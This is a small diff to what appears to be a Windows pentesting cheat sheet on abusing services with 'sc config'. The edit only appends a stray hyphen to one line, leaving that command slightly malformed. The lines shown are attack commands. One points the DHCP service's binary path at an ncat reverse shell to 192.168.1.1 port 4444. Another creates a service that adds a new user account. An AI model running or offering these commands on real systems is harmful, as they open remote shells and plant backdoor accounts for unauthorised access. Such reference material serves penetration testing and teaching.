@@ -325,7 +325,7 @@ Interact with services and create new ones
 ```
 sc config Dhcp start=auto
 sc config Dhcp start=disabled
-sc config Dhcp binPath= "ncat.exe 192.168.1.1 4444 -e cmd.exe"
+sc config Dhcp binPath= "ncat.exe 192.168.1.1 4444 -e cmd.exe"-
 sc config test binPath= "net user somebody /add"
 sc start test
 ```
